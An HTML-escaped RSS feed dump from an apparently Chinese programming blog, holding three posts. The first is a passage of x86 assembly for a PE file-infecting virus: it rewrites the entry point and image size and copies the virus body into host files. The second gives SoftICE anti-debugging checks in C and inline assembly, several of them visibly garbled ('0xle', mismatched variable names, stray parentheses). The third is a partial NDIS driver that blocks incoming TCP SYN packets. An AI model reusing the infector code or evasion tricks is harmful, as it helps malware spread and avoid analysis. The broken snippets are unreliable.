mov&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx,[ebp+newEip] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; [eax+28h],ebx&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;更新指针值 &lt;/P&gt;
&lt;P&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;comment $ &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx,[eax+50h]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;更新ImageSize &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx,VirusLen &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,[ebp+sec_align] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xor&amp;nbsp;&amp;nbsp;&amp;nbsp; edx,edx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xchg&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,ebx&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;eax和ebx交换... &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cdq &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; div&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; test&amp;nbsp;&amp;nbsp;&amp;nbsp; edx,edx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; je&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; @@@3 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; inc&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;@@@3: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mul&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xchg&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,ebx&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;还原&amp;nbsp; eax-&amp;gt;pe_Header &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; [eax+50h],ebx&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;保更新后的Image_Size大小 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;$ &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [eax+8],'dark' &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cld&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;写入 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,VirusLen &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; edi,[ebp+oldEnd] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; edi,[ebp+pMem] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; lea&amp;nbsp;&amp;nbsp;&amp;nbsp; esi,[ebp+vBegin] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; rep&amp;nbsp;&amp;nbsp;&amp;nbsp; movsb&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;写入文件,all is OK! &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xor&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; sub&amp;nbsp;&amp;nbsp;&amp;nbsp; edi,[ebp+pMem] &lt;/P&gt;
&lt;P&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; FILE_BEGIN &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; edi &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+hfile] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+aSetFilePointer] &lt;/P&gt;
&lt;P&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+hfile] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+aSetEndOfFile] &lt;BR&gt;;============================disLen.asm &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; lea&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,[ebp+u32] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebp+aLoadLibrary] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; test&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; jnz&amp;nbsp;&amp;nbsp;&amp;nbsp; @g1&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;@g1: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; lea&amp;nbsp;&amp;nbsp;&amp;nbsp; EDX,[EBP+sMessageBoxA] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; edx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [ebp+aGetProcAddress] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+aMessageBoxA],eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/P&gt;
&lt;P&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;----------------------------------------- &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx,VirusLen &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,8 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cld &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; lea&amp;nbsp;&amp;nbsp;&amp;nbsp; edi,[ebp+val] &lt;BR&gt;L1: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; rol&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx,4 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; binToAscii &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; loop&amp;nbsp;&amp;nbsp;&amp;nbsp; L1 &lt;/P&gt;
&lt;P&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; 40h+1000h &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; lea&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,[ebp+sztit] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; lea&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,[ebp+CopyRight] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; 0 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+aMessageBoxA] &lt;/P&gt;
&lt;P&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; jmp&amp;nbsp;&amp;nbsp;&amp;nbsp; __where &lt;BR&gt;;----------------------------------------- &lt;/P&gt;
&lt;P&gt;binToAscii&amp;nbsp;&amp;nbsp;&amp;nbsp; proc&amp;nbsp; near &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,ebx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; and&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,0fh &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; al,30h &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cmp&amp;nbsp;&amp;nbsp;&amp;nbsp; al,39h &lt;BR&gt;&amp;nbsp; jbe&amp;nbsp;&amp;nbsp;&amp;nbsp; @f &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; al,7 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp; @@: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; stosb &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ret &lt;BR&gt;binToAscii&amp;nbsp;&amp;nbsp;&amp;nbsp; endp &lt;BR&gt;;----------------------------over-----by hume &lt;BR&gt;&lt;/P&gt;</description></item><item><title>如何防范动态调试(Anti-Debug)(SoftICE篇)</title><link>https://blogs.qipai360.cn/post/anti-debug-protection-softice/</link><pubDate>Fri, 10 Jun 2005 10:18:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/anti-debug-protection-softice/</guid><description>&lt;P&gt;Windows NT/2000/XP系统:&lt;/P&gt;
&lt;P&gt;1.判断NTICE服务是否运行&lt;BR&gt;在Windows NT/2000/XP系统中,SoftICE是一个内核设备驱动类型的服务,服务名为NTICE,因此可通过判断NTICE服务是否运行来检测SoftICE.&lt;/P&gt;
&lt;P&gt;BOOL SoftICEIsLoad()&lt;BR&gt;{&lt;BR&gt;&amp;nbsp;SERVICE_STATUS ssStatus;&lt;BR&gt;&amp;nbsp;// 打开服务控制管理器&lt;BR&gt;&amp;nbsp;SH_HANDLE shServiceManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);&lt;BR&gt;&amp;nbsp;if(NULL == shServiceManager)&lt;BR&gt;&amp;nbsp;&amp;nbsp;return FALSE;&lt;BR&gt;&amp;nbsp;// 打开NTICE服务&lt;BR&gt;&amp;nbsp;SC_HANDLE shMyService = OpenService(shServiceManager, "NTICE", SERVICE_ALL_ACCESS);&lt;BR&gt;&amp;nbsp;if(QueryServiceStatus(shMyService, &amp;amp;ssStatus)) == 0)&lt;BR&gt;&amp;nbsp;{&lt;BR&gt;&amp;nbsp;&amp;nbsp;CloseServiceHandle(shMyService);&lt;BR&gt;&amp;nbsp;&amp;nbsp;return FALSE;&lt;BR&gt;&amp;nbsp;}&lt;BR&gt;&amp;nbsp;// NTICE服务正在运行&lt;BR&gt;&amp;nbsp;if(SERVICE_RUNNING == ssStatus.dwCurrentState)&lt;BR&gt;&amp;nbsp;{&lt;BR&gt;&amp;nbsp;&amp;nbsp;CloseServiceHandle(shMyService);&lt;BR&gt;&amp;nbsp;&amp;nbsp;return TRUE;&lt;BR&gt;&amp;nbsp;}&lt;BR&gt;&amp;nbsp;return FALSE;&lt;BR&gt;}&lt;/P&gt;
&lt;P&gt;2.利用 UnhandledExceptionFilter 检测&lt;BR&gt;如果SoftICE加载，SoftICE会在kernel32.dll的UnhandledExceptionFilter函数第一字节外设一个INT 3指令,即用"CC"代替原机器码"55".因此就可根据这个"CC"机器码,判断SoftICE是否加载.&lt;/P&gt;
&lt;P&gt;BOOL SoftICEIsLoad()&lt;BR&gt;{&lt;BR&gt;&amp;nbsp;FARPROC Uadder;&lt;BR&gt;&amp;nbsp;BYTE Mark = 0;&lt;BR&gt;&amp;nbsp;(FARPROC&amp;amp;)Uaddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "UnhandledExceptionFilter");&lt;BR&gt;&amp;nbsp;Mark = *((BYTE)Uaddr);&lt;BR&gt;&amp;nbsp;// 取UnhandledExceptionFilter函数的第一字节&lt;BR&gt;&amp;nbsp;if(0xCC == Mark) // 如是则SoftICE已加载&lt;BR&gt;&amp;nbsp;&amp;nbsp;return TRUE;&lt;BR&gt;&amp;nbsp;&lt;BR&gt;&amp;nbsp;return FALSE;&lt;BR&gt;}&lt;/P&gt;
&lt;P&gt;3.检测断点&lt;BR&gt;由于SoftICE有针对API设置断点的强大功能,它工作时是在函数前插入INT 3指令(机器码CC),因此检测函数首地址机器码是否为CC就可以判断是否被SofeICE设置断点跟踪.&lt;/P&gt;
&lt;P&gt;#include &amp;lt;windows.h&amp;gt;&lt;/P&gt;
&lt;P&gt;BOOL IsBPX(void* address);&lt;/P&gt;
&lt;P&gt;int WINAPI WinMain(HINSTANCE hInstanec, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)&lt;BR&gt;{&lt;BR&gt;&amp;nbsp;void* addr;&lt;BR&gt;&amp;nbsp;addr=MessageBox;&lt;BR&gt;&amp;nbsp;if(IsBPX(addr))&lt;BR&gt;&amp;nbsp;{&lt;BR&gt;&amp;nbsp;&amp;nbsp;MessageBox(NULL,"don't debug me.","help!",MB_HELP);&lt;BR&gt;&amp;nbsp;}else{&lt;BR&gt;&amp;nbsp;&amp;nbsp;MessageBox(NULL,"no one.","go go go!",MB_OK);&lt;BR&gt;&amp;nbsp;}&lt;BR&gt;&amp;nbsp;&lt;BR&gt;&amp;nbsp;return 0;&lt;BR&gt;}&lt;/P&gt;
&lt;P&gt;BOOL IsBPX(void* address)&lt;BR&gt;{&lt;BR&gt;&amp;nbsp;_asm&lt;BR&gt;&amp;nbsp;{&lt;BR&gt;&amp;nbsp;&amp;nbsp;MOV ESI , address // 被监视函数的地址&lt;BR&gt;&amp;nbsp;&amp;nbsp;MOV AL&amp;nbsp; , [ESI]&amp;nbsp;&amp;nbsp;// 取该函数的机器码&lt;BR&gt;&amp;nbsp;&amp;nbsp;CMP AL&amp;nbsp; , 0xCC&amp;nbsp;&amp;nbsp;// 检测机器码是否为0xCC&lt;BR&gt;&amp;nbsp;&amp;nbsp;JE&amp;nbsp; SoftICELoad&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;// 如果是则函数被跟踪&lt;BR&gt;&amp;nbsp;}&lt;BR&gt;&amp;nbsp;return FALSE;&lt;BR&gt;SoftICELoad:&lt;BR&gt;&amp;nbsp;return TRUE;&lt;BR&gt;}&lt;/P&gt;
&lt;P&gt;Windows 9x系统:&lt;BR&gt;1.检测INT 1和INT 3服务的差&lt;BR&gt;在Windows 9x系统中,SoftICE驻留后修改INT 1和INT 3中断的入口,指向它自己的处理程序,其中INT 1和INT 3服务的差总是为1EH利用这点就可检测SoftICE.&lt;BR&gt;这种方法要结合SEH来实现,否则在Windows 2000/XP系统中会产生断点异常.&lt;/P&gt;
&lt;P&gt;BOOL SoftICEIsLoad()&lt;BR&gt;{&lt;BR&gt;&amp;nbsp;char pIDT[6]={0};// IDT保存在这&lt;BR&gt;&amp;nbsp;try&lt;BR&gt;&amp;nbsp;{&lt;BR&gt;&amp;nbsp;&amp;nbsp;_asm&lt;BR&gt;&amp;nbsp;&amp;nbsp;{&lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;sidt fword ptr pIDT&amp;nbsp;// 取IDT内容&lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;mov&amp;nbsp;eax,dword ptr[pIDT+2]&amp;nbsp;// 获取IDT表的基地址&lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;add eax,8&lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;mov ebx,[eax]&amp;nbsp;// 取INT 1的低位偏移&lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;add eax,16&lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;mov eax,[eax]&amp;nbsp;// 取INT 3的低位偏移&lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;and eax,0ffffh&lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;and ebx,0ffffh&lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;sub eax,ebx&amp;nbsp;&amp;nbsp;// 计算低位偏移这差&lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;cmp eax,0xle&amp;nbsp;如果SoftICE驻留内存,则差为0xle&lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;jz SoftICELoad&lt;BR&gt;&amp;nbsp;&amp;nbsp;}&lt;BR&gt;&amp;nbsp;}&lt;BR&gt;&amp;nbsp;catch(...)&lt;BR&gt;&amp;nbsp;{&lt;BR&gt;&amp;nbsp;&amp;nbsp;return FALSE&lt;BR&gt;&amp;nbsp;}&lt;BR&gt;&amp;nbsp;return FALSE;&lt;BR&gt;SoftICELoad:&lt;BR&gt;&amp;nbsp;return TRUE;&amp;nbsp;&lt;BR&gt;}&lt;/P&gt;
&lt;P&gt;2.检测SoftICE VxD ID&lt;/P&gt;
&lt;P&gt;BOOL SoftICEIsLoad()&lt;BR&gt;{&lt;BR&gt;&amp;nbsp;_asm&lt;BR&gt;&amp;nbsp;{&lt;BR&gt;&amp;nbsp;&amp;nbsp;xor&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; di,di&lt;BR&gt;&amp;nbsp; &amp;nbsp;mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; es,di&lt;BR&gt;&amp;nbsp; &amp;nbsp;mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ax, 1684h&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; bx, 0202h&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ; VxD ID of winice&lt;BR&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;int&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2Fh&lt;BR&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ax, es&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ; ES:DI -&amp;gt; VxD API entry point&lt;BR&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ax, di&lt;BR&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;test&amp;nbsp;&amp;nbsp;&amp;nbsp; ax,ax&lt;BR&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;jnz&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; SoftICELoad&lt;BR&gt;&amp;nbsp; }&lt;BR&gt;&amp;nbsp;return FALSE;&lt;BR&gt;SoftICELoad:&lt;BR&gt;&amp;nbsp;return TRUE:&lt;BR&gt;}&lt;/P&gt;
&lt;P&gt;&amp;nbsp;&lt;/P&gt;</description></item><item><title>书写NDIS过滤钩子驱动实现ip包过滤</title><link>https://blogs.qipai360.cn/post/writing-ndis-filter-hook-driver-for-ip-packet-filtering/</link><pubDate>Sun, 10 Oct 2004 19:37:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/writing-ndis-filter-hook-driver-for-ip-packet-filtering/</guid><description>&lt;p&gt;&lt;span style="font-family: 'Courier New';"&gt;在普通的WINDOWS 2000下实现实现包过滤的方法主要是书写NDIS过滤驱动程序，需要的技巧比较高，而且烦琐，需要考虑很多细节。但是对于很多应用而言，只需要能更方便的对ip包进行过滤处理，其实NDIS对于ip包的过滤提供一种书写过滤钩子驱动的方式，主要方法是： &lt;br /&gt;驱动中建立一个普通的设备，然后通过IOCTL_PF_SET_EXTENSION_POINTER操作将你的内核模式的过滤钩子挂接到系统默认的ip过滤驱动上，这样你就可以在自己的过滤钩子里面实现完整的基于包的各种分析和过滤的处理了。 &lt;br /&gt;下面就是一个完整的NDIS过滤钩子驱动的代码拒绝所有外来的TCP带S的建立连接的请求。 &lt;br /&gt;注意事项： &lt;br /&gt;1。需要在DDK环境中编译 &lt;br /&gt;2。需要修改注册表中LMHK\System\\CurrentControlSet\\Services\\IPFILTERDRIVER的START类型为3，让他随系统启动而启动 &lt;br /&gt;3。编译生成了sys文件后需要拷贝到winnt\system32\drivers目录下 &lt;br /&gt;4。需要运行一个程序后手动生成注册表项 &lt;br /&gt;5。使用时用net start f *** ilthook启动驱动，用net stop f *** ilthook停止驱动 &lt;br /&gt;6。此方法只能对ip包进行过滤，其他的协议不会经过这个过滤钩子进行处理。 &lt;br /&gt;//驱动程序的头文件 &lt;br /&gt;#include "ntddk.h" &lt;br /&gt;#include "ntddndis.h" &lt;br /&gt;#include "pfhook.h" &lt;br /&gt;#ifndef __NTHANDLE_H &lt;br /&gt;#define __NTHANDLE_H &lt;br /&gt;#define NT_DEVICE_NAME L"\\Device\\F *** ilthook" &lt;br /&gt;#define DOS_DEVICE_NAME L"\\DosDevices\\F *** ilthook" &lt;br /&gt;&lt;br /&gt;#define PROT_TCP 6 &lt;br /&gt;&lt;br /&gt;#include "ntddk.h" &lt;br /&gt;#include " *** ilthook.h" &lt;br /&gt;&lt;br /&gt;typedef struct IPHeader { &lt;br /&gt;UCHAR iph_verlen; // Version and length &lt;br /&gt;UCHAR iph_tos; // Type of service &lt;br /&gt;USHORT iph_length; // Total datagram length &lt;br /&gt;USHORT iph_id; // Identification &lt;br /&gt;USHORT iph_offset; // Flags, fragment offset &lt;br /&gt;UCHAR iph_ttl; // Time to live &lt;br /&gt;UCHAR iph_protocol; // Protocol &lt;br /&gt;USHORT iph_xsum; // Header checksum &lt;br /&gt;ULONG iph_src; // Source address &lt;br /&gt;ULONG iph_dest; // Destination address &lt;br /&gt;} IPHeader; &lt;br /&gt;&lt;br /&gt;NTSTATUS &lt;br /&gt;DriverEntry( &lt;br /&gt;IN PDRIVER_OBJECT DriverObject, &lt;br /&gt;IN PUNICODE_STRING RegistryPath); &lt;br /&gt;&lt;br /&gt;NTSTATUS &lt;br /&gt;CreateFilterHook &lt;br /&gt;(IN PDRIVER_OBJECT DriverObject); &lt;br /&gt;&lt;br /&gt;VOID &lt;br /&gt;DriverUnload &lt;br /&gt;(IN PDRIVER_OBJECT DriverObject); &lt;br /&gt;&lt;br /&gt;PF_FORWARD_ACTION &lt;br /&gt;IpFilterHook( &lt;br /&gt;IN unsigned char *PacketHeader, &lt;br /&gt;IN unsigned char *Packet, &lt;br /&gt;IN unsigned int PacketLength, &lt;br /&gt;IN unsigned int RecvInterfaceIndex, &lt;br /&gt;IN unsigned int SendInterfaceIndex, &lt;br /&gt;IN IPAddr RecvLinkNextHop, &lt;br /&gt;IN IPAddr SendLinkNextHop); &lt;br /&gt;#endif &lt;br /&gt;&lt;br /&gt;//驱动程序的c文件 &lt;br /&gt;#define PROT_TCP 6 &lt;br /&gt;#include "ntddk.h" &lt;br /&gt;#include "ntddndis.h" &lt;br /&gt;#include "pfhook.h" &lt;br /&gt;#include "f *** ilthook.h" &lt;br /&gt;&lt;br /&gt;PDEVICE_OBJECT deviceObject; &lt;br /&gt;UNICODE_STRING win32DeviceName; &lt;br /&gt;&lt;br /&gt;//住驱动入口点 &lt;br /&gt;NTSTATUS &lt;br /&gt;DriverEntry( &lt;br /&gt;IN PDRIVER_OBJECT DriverObject, &lt;br /&gt;IN PUNICODE_STRING RegistryPath &lt;br /&gt;) &lt;br /&gt;{ &lt;br /&gt;NTSTATUS status = STATUS_SUCCESS; &lt;br /&gt;UNICODE_STRING ntDeviceName; &lt;br /&gt;&lt;br /&gt;RtlInitUnicodeString(&amp;amp;ntDeviceName,NT_DEVICE_NAME); &lt;br /&gt;//建立一个过滤钩子驱动设备 &lt;br /&gt;status = IoCreateDevice (DriverObject,0,&amp;amp;ntDeviceName,FILE_DEVICE_UNKNOWN,0,TRUE,&amp;amp;deviceObject); &lt;br /&gt;if (!NT_SUCCESS (status)) { &lt;br /&gt;goto ERROR; &lt;br /&gt;} &lt;br /&gt;RtlInitUnicodeString(&amp;amp;win32DeviceName, DOS_DEVICE_NAME); &lt;br 